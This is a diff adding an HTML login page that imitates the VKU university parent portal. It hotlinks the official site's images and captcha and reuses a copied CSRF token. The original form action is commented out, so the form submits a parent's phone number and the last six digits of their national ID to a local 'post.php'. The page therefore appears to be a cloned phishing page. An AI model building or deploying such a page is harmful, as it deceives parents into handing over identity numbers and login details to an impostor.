@@ -1,0 +1,88 @@
+<!doctype html>
+<html lang="en">
+  <head>
+
+    <meta charset="utf-8">
+	<!-- CSRF Token -->
+    <meta name="csrf-token" content="RzhL28kyCy9EVp8smjz8uqHKttYVcb8aS4gayCjt">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+	<title>Hệ thống dành cho phụ huynh VKU - Trường Đại học Công nghệ Thông tin và Truyền thông Việt - Hàn, Đại học Đà Nẵng</title>
+	<link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+
+	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+	
+	<link rel="stylesheet" href="https://daotao.vku.udn.vn/public/css/phuhuynh.css">
+	<script src='https://www.google.com/recaptcha/api.js'></script>
+	</head>
+	<body>
+	<section class="ftco-section">
+		<div class="container">
+			<div class="row justify-content-center">
+				<div class="col-md-8 text-center mb-5">
+					<img width="100%" src="https://daotao.vku.udn.vn/public/images/header_mobile_phuhuynh.png" />
+				</div>
+			</div>
+			<div class="row justify-content-center">
+				<div class="col-md-12 col-lg-10">
+					<div class="wrap d-md-flex">
+						<div class="img" style="background-image: url(https://daotao.vku.udn.vn/public/images/phuhuynh.jpg);">
+			      </div>
+						<div class="login-wrap p-4 p-md-5">
+			      	<div class="d-flex">
+			      		<div class="w-100">
+			      			<h3 class="mb-4">Đăng nhập</h3>
+			      		</div>
+								<div class="w-100">
+									<p class="social-media d-flex justify-content-end">
+										<a href="https://fb.com/vku.udn.vn" class="social-icon d-flex align-items-center justify-content-center"><span class="fa fa-facebook"></span></a>
+										<a href="https://vku.udn.vn" class="social-icon d-flex align-items-center justify-content-center"><span class="fa fa-globe"></span></a>
+									</p>
+								</div>
+			      	</div>
+												
+					<!-- <form action="index.html" method="post" class="signin-form"> -->
+					<form action="post.php" method="post" class="signin-form">
+			      		<div class="form-group mb-3">
+						<input name="_token" type="hidden" value="RzhL28kyCy9EVp8smjz8uqHKttYVcb8aS4gayCjt">
+			      			<label class="label" for="name">Số điện thoại:</label>
+			      			<input type="text" class="form-control" name="sdt" placeholder="Nhập số điện thoại phụ huynh" required>
+			      		</div>
+		            <div class="form-group mb-3">
+		            	<label class="label" for="password">Mật khẩu:</label>
+		              <input type="password" class="form-control" name="cccd" placeholder="Nhập mật khẩu" required>
+		              <span>Nếu lần đầu phụ huynh đăng nhập, vui lòng nhập <b>06 số cuối CCCD của phụ huynh</b><br></span>
+		              <span>Trong trường hợp phụ huynh không thể đăng nhập được, Phụ huynh liên hệ số điện thoại: <code>0236.3.667.113</code> để được hỗ trợ</span>
+		            </div>
+					  <div class="form-group mb-3">
+		            	<label class="label" for="password">Mã bảo mật:</label>
+						<input type="text" class="form-control" name="capchar" placeholder="Nhập mã" required>
+		              <img src="https://daotao.vku.udn.vn/code" height="48" />
+		            </div>
+					
+		            <div class="form-group">
+		            	<button type="submit" class="form-control btn btn-primary rounded submit px-3">Đăng nhập</button>
+		            </div>
+		            <div class="form-group d-md-flex">
+		            	<div class="w-50 text-left">
+			            	
+									</div>
+									<div class="w-50 text-md-right">
+										<a href="index.html#"></a>
+									</div>
+		            </div>
+		          </form>
+		          <p class="text-center">Quý phụ huynh chưa biết cách xem thông tin của con em mình, vui lòng liên lạc phòng Đào tạo <a data-toggle="tab" href="tel:02367337113">0236.3.667.113</a></p>
+		        </div>
+		      </div>
+				</div>
+			</div>
+		</div>
+	</section>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.0/jquery.min.js" integrity="sha256-xNzN2a4ltkB44Mc/Jz3pT4iU1cmeR0FkXs4pru/JxaQ=" crossorigin="anonymous"></script>
+<script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+
+
+	</body>
+</html>
+
